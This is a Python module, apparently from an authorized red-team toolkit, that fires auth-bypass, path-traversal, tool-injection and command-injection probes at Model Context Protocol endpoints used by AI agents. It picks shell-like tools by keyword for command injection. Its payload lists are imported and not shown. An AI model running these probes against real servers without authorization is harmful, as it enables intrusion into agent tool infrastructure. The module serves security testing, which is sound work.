"""
MCP endpoint attacker module for authorized red-team engagements.

THIS MODULE PERFORMS ACTIVE ATTACKS AGAINST MCP ENDPOINTS.
It must ONLY be used against systems for which you have EXPLICIT WRITTEN
AUTHORIZATION. Unauthorized use may violate the Computer Fraud and Abuse Act,
the Computer Misuse Act, and equivalent laws worldwide.

Usage (requires --i-have-authorization flag via CLI, or authorized=True in code):
    attacker = MCPAttacker(authorized=True)
    report = await attacker.attack(target, transport="http", mode="deep")
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
from datetime import datetime, timezone

import httpx

from ..models.mcp_result import (
    MCPAttackReport,
    MCPAttackResult,
    MCPScanResult,
    MCPTransport,
    MCPVulnSeverity,
)
from ..utils.mcp_payloads import (
    AUTH_BYPASS_PAYLOADS,
    COMMAND_INJECTION_PAYLOADS,
    PATH_TRAVERSAL_PAYLOADS,
    TOOL_INJECTION_PAYLOADS,
)

from ..exceptions import AuthorizationRequired

from ._base import BaseAttacker


from ..utils.constants import MCP_PROTOCOL_VERSION, USER_AGENT
logger = logging.getLogger(__name__)

class MCPAttacker(BaseAttacker):
    """
    Active attack module for MCP endpoints.

    Requires authorized=True. Will refuse all operations if not authorized.
    """

    _MODULE_NAME = "MCP"

    def __init__(self, authorized: bool = False, judge: object | None = None) -> None:
        super().__init__(authorized=authorized, judge=judge)

    async def attack(
        self,
        target: str,
        transport: str = "http",
        mode: str = "safe",
        headers: dict[str, str] | None = None,
        timeout: float = 15.0,
        scan_result: MCPScanResult | None = None,
    ) -> MCPAttackReport:
        """
        Run attack suite against the MCP endpoint.

        Args:
            target:      MCP endpoint URL or 'stdio://...'.
            transport:   "http", "sse", or "stdio".
            mode:        "safe" (limited probes) or "deep" (full suite).
            headers:     HTTP headers including auth.
            timeout:     Per-request timeout.
            scan_result: Optional prior MCPScanResult to guide attacks.
        """
        logger.warning(
            "MCP attack started against target=%s transport=%s mode=%s timestamp=%s",
            target,
            transport,
            mode,
            datetime.now(timezone.utc).isoformat(),
        )

        start = time.monotonic()
        all_results: list[MCPAttackResult] = []

        # Auth bypass probes (always run — passive enough to justify in safe mode)
        auth_results = await self._attack_auth_bypass(target, headers or {}, timeout)
        all_results.extend(auth_results)

        if mode == "deep":
            # Path traversal against known resources
            pt_results = await self._attack_path_traversal(
                target, headers or {}, timeout, scan_result
            )
            all_results.extend(pt_results)

            # Tool injection against enumerated tools
            if scan_result and scan_result.tools:
                ti_results = await self._attack_tool_injection(
                    target, headers or {}, timeout, scan_result
                )
                all_results.extend(ti_results)

                # Command injection only against shell-like tools
                shell_tools = [
                    t for t in scan_result.tools
                    if any(
                        k in t.name.lower()
                        for k in ["shell", "exec", "run", "bash", "cmd", "terminal"]
                    )
                ]
                if shell_tools:
                    ci_results = await self._attack_command_injection(
                        target, headers or {}, timeout, shell_tools
                    )
                    all_results.extend(ci_results)

        scan_duration = time.monotonic() - start
        triggered = [r for r in all_results if r.triggered]

        report = MCPAttackReport(
            target=target,
            authorized=True,
            transport=MCPTransport(transport),
            attacks_run=len(all_results),
            attacks_triggered=len(triggered),
            results=all_results,
            scan_duration=scan_duration,
        )

        # Optional LLM enrichment
        if self._judge and getattr(self._judge, "provider", None):
            self._enrich_with_llm(report)

        return report

    def _enrich_with_llm(self, report: MCPAttackReport) -> None:
        """Use LLM judge to build an attack-path narrative for triggered attacks."""
        if not self._judge:
            return
        triggered = [r for r in report.results if r.triggered]
        if not triggered:
            return
        try:
            summary = "; ".join(f"{r.attack_id}:{r.title}" for r in triggered[:5])
            verdict = self._judge.evaluate(
                category="MCP attack-path",
                probe=summary,
                response=f"{len(triggered)} attack(s) triggered",
            )
            reason = verdict.get("reason", "")
            if reason:
                triggered[0].evidence += f" [LLM analysis: {reason}]"
        except Exception as exc:  # noqa: BLE001
            logger.debug("LLM enrichment error: %s", exc)

    # ------------------------------------------------------------------
    # Auth bypass
    # ------------------------------------------------------------------

    async def _attack_auth_bypass(
        self,
        target: str,
        headers: dict,
        timeout: float,
    ) -> list[MCPAttackResult]:
        results = []
        init_payload = {
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {"protocolVersion": MCP_PROTOCOL_VERSION, "capabilities": {},
                       "clientInfo": {"name": "offensive-ai"}},
        }
        for probe in AUTH_BYPASS_PAYLOADS:
            test_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json, text/event-stream",
                "User-Agent": USER_AGENT,
                **probe.get("headers", {}),
            }
            triggered = False
            response_text = ""
            try:
                async with httpx.AsyncClient(headers=test_headers, timeout=timeout, trust_env=False) as client:
                    resp = await client.post(target, json=init_payload)
                    response_text = resp.text[:500]
                    if probe.get("detect") == "http_200" and resp.status_code == 200:
                        triggered = True
            except Exception as exc:
                response_text = str(exc)

            results.append(MCPAttackResult(
                attack_id=probe["id"],
                target=target,
                payload=str(probe.get("headers", {})),
                response=response_text,
                triggered=triggered,
                severity=MCPVulnSeverity(probe["severity"]) if triggered else MCPVulnSeverity.INFO,
                title=probe["description"],
                description=probe["description"],
                evidence=response_text if triggered else "",
            ))
        return results

    # ------------------------------------------------------------------
    # Path traversal
    # ------------------------------------------------------------------

    async def _attack_path_traversal(
        self,
        target: str,
        headers: dict,
        timeout: float,
        scan_result: MCPScanResult | None,
    ) -> list[MCPAttackResult]:
        results = []
        base_resource_uri = ""
        if scan_result and scan_result.resources:
            # Use the first resource URI as a base to inject traversal
            base_resource_uri = scan_result.resources[0].uri

        for probe in PATH_TRAVERSAL_PAYLOADS:
            # Use probe path directly or replace last path component
            test_uri = probe["path"]
            if base_resource_uri:
                # Try replacing the base path's last component
                parts = base_resource_uri.rsplit("/", 1)
                if len(parts) > 1:
                    test_uri = parts[0] + "/" + probe["path"]

            payload = {
                "jsonrpc": "2.0", "id": 10, "method": "resources/read",
                "params": {"uri": test_uri},
            }
            triggered = False
            response_text = ""
            evidence = ""
            try:
                async with httpx.AsyncClient(
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json, text/event-stream",
                             "User-Agent": USER_AGENT, **headers},
                    timeout=timeout,
                    trust_env=False,
                ) as client:
                    resp = await client.post(target, json=payload)
                    response_text = resp.text[:1000]
                    for signal in probe.get("detect_in_response", []):
                        if signal.lower() in response_text.lower():
                            triggered = True
                            evidence = f"Response contained '{signal}'"
                            break
            except Exception as exc:
                response_text = str(exc)

            results.append(MCPAttackResult(
                attack_id=probe["id"],
                target=target,
                resource_uri=test_uri,
                payload=test_uri,
                response=response_text,
                triggered=triggered,
                severity=MCPVulnSeverity(probe["severity"]) if triggered else MCPVulnSeverity.INFO,
                title=probe["description"],
                description=probe["description"],
                evidence=evidence,
            ))
        return results

    # ------------------------------------------------------------------
    # Tool injection
    # ------------------------------------------------------------------

    async def _attack_tool_injection(
        self,
        target: str,
        headers: dict,
        timeout: float,
        scan_result: MCPScanResult,
    ) -> list[MCPAttackResult]:
        results = []
        for tool in scan_result.tools[:3]:   # Limit to first 3 tools
            for probe in TOOL_INJECTION_PAYLOADS:
                # Build a minimal valid call using first string parameter
                input_schema = tool.input_schema
                params: dict = {}
                properties = input_schema.get("properties", {})
                if properties:
                    first_param = next(iter(properties))
                    params[first_param] = probe["payload"]
                else:
                    params["input"] = probe["payload"]

                payload = {
                    "jsonrpc": "2.0", "id": 20, "method": "tools/call",
                    "params": {"name": tool.name, "arguments": params},
                }
                triggered = False
                response_text = ""
                evidence = ""
                try:
                    async with httpx.AsyncClient(
                        headers={"Content-Type": "application/json",
                                 "Accept": "application/json, text/event-stream",
                                 "User-Agent": USER_AGENT, **headers},
                        timeout=timeout,
                        trust_env=False,
                    ) as client:
                        resp = await client.post(target, json=payload)
                        response_text = resp.text[:500]
                        for signal in probe.get("detect_in_response", []):
                            if signal.lower() in response_text.lower():
                                triggered = True
                                evidence = f"Response contained '{signal}'"
                                break
                except Exception as exc:
                    response_text = str(exc)

                results.append(MCPAttackResult(
                    attack_id=probe["id"],
                    target=target,
                    tool_name=tool.name,
                    payload=probe["payload"][:200],
                    response=response_text,
                    triggered=triggered,
                    severity=MCPVulnSeverity(probe["severity"]) if triggered else MCPVulnSeverity.INFO,
                    title=probe["description"],
                    description=probe["description"],
                    evidence=evidence,
                ))
        return results

    # ------------------------------------------------------------------
    # Command injection
    # ------------------------------------------------------------------

    async def _attack_command_injection(
        self,
        target: str,
        headers: dict,
        timeout: float,
        shell_tools: list,
    ) -> list[MCPAttackResult]:
        results = []
        for tool in shell_tools[:2]:   # Limit to first 2 shell tools
            for probe in COMMAND_INJECTION_PAYLOADS:
                input_schema = tool.input_schema
                properties = input_schema.get("properties", {})
                params: dict = {}
                if properties:
                    first_param = next(iter(properties))
                    params[first_param] = probe["payload"]
                else:
                    params["command"] = probe["payload"]

                payload = {
                    "jsonrpc": "2.0", "id": 30, "method": "tools/call",
                    "params": {"name": tool.name, "arguments": params},
                }
                triggered = False
                response_text = ""
                evidence = ""
                try:
                    async with httpx.AsyncClient(
                        headers={"Content-Type": "application/json",
                                 "Accept": "application/json, text/event-stream",
                                 "User-Agent": USER_AGENT, **headers},
                        timeout=timeout,
                        trust_env=False,
                    ) as client:
                        resp = await client.post(target, json=payload)
                        response_text = resp.text[:500]
                        for signal in probe.get("detect_in_response", []):
                            if signal.lower() in response_text.lower():
                                triggered = True
                                evidence = f"Response contained '{signal}'"
                                break
                except Exception as exc:
                    response_text = str(exc)

                results.append(MCPAttackResult(
                    attack_id=probe["id"],
                    target=target,
                    tool_name=tool.name,
                    payload=probe["payload"][:200],
                    response=response_text,
                    triggered=triggered,
                    severity=MCPVulnSeverity(probe["severity"]) if triggered else MCPVulnSeverity.INFO,
                    title=probe["description"],
                    description=probe["description"],
                    evidence=evidence,
                ))
        return results
